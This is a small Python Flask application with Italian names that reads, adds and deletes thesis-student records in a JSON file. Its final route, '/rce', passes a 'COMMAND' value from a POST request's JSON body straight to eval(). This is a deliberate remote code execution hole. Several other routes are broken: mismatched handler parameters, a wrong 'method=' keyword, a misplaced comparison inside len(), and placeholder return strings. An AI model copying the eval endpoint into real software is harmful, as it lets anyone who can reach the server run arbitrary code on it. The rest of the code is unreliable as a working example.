import datetime
from flask import Flask, jsonify, request,send_from_directory
import json

app = Flask(__name__)

@app.route('/tesisti', methods=['GET'])
def tesiti():
    try:
        
        with open("./tesisti.json", "r", encoding="utf-8") as f:
            
            dati = json.load(f)  

        return jsonify(dati), 200


    except Exception as e:
        
        return jsonify({"errore": str(e)})


@app.route('/tesista', methods=['GET'])
def tesista():
    try: 

        with open("./tesisti.json", "r", encoding="utf-8") as f:
            
            dati = json.load(f)

            for i in range(0,len(dati)): 
                
                SURNAME = request.form['SURNAME']
                print(SURNAME)
        return("ciao")
    

    except Exception as e: 
        print(e)


@app.route('/datitesista', methods=['GET'])
def datitesista(): 
    try: 
        with open("./tesisti.json", "r", encoding="utf-8")as f: 
            dati = json.load(f)
            for i in range(0,len(dati)): 
                SURNAME = dati[i]["SURNAME"]
                
                print(SURNAME)
        return("distefano")
            
    except Exception as e: 
        print(e)
        return f"Errore: {str(e)}", 500
    


@app.route('/eta', methods=['GET'])
def eta():

    with open("./tesisti.json", "r", encoding="utf-8") as f: 
        dati = json.load(f)  
        # GET http://localhost:5000/eta?tesista=Distefano

        surname = request.args.get('tesista')

        for entry in dati:  
            if( surname == entry['SURNAME'] ) :
                print(jsonify({"eta": entry['AGE']}))   
                return  jsonify({"eta": entry['AGE']})
                
        return 'Nessun Tesista con Questo Nome'
    
@app.route('/nuovo_tesista',methods=['POST'])
def nuovo_tesista(): 
    try: 
        with open("./tesisti.json", "r", encoding="utf-8") as f: 
            dati=json.load(f)
            nuovo_tes=request.get_json()

            print(type(nuovo_tes))

            print(nuovo_tes, 'lunghezza:', len(nuovo_tes), 'chiavi: ', print(nuovo_tes.keys()))

            if (('NAME' in nuovo_tes.keys()) and ('SURNAME' in nuovo_tes.keys()) and (len(nuovo_tes) == 3)):

                dati.append(nuovo_tes)
                #salavre i nuovi dati e cosi aggiorno il file 
                with open("./tesisti.json", "w", encoding="utf-8") as f:
                    json.dump(dati, f,  ensure_ascii=False)

            else:
                return 'IL FORM INSERITO NON RISPETTA LA STRUTTURA DEL DATABASE'

            return jsonify({"messaggio": "Tesista aggiunto con successo!"})
    except Exception as e: 
        print(e)
        return jsonify({"errore": str(e)})
    
@app.route('/elimina_tesista/<string:NAME>/<string:SURNAME>', methods=['DELETE'])
def elimina_tesista(tesista):
    try:
        #leggo file json
        with open("./tesisti.json", "r", encoding="utf-8") as f:
            dati = json.load(f)
        
        if tesista in tesiti: 
            tesiti[tesista]["nome"] = ""     
            tesiti[tesista]["cognome"] = ""  
            return jsonify({"message": f"Nome e cognome della persona {tesista} eliminati"}),
        else: 
            return jsonify({"error": "Persona non trovata"}),

    except Exception as e:
       
        print(f"errore tutto da capo: {e}")
        return jsonify({"errore": str(e)})


@app.route('/login', methods = ['GET'])
def login():
    return send_from_directory('','Login.html')

@app.route('/rce', method=['POST'])
def rce():
    
    json_command=request.get_json()

    if(len(json_command == 1)):
        eval(json_command['COMMAND'])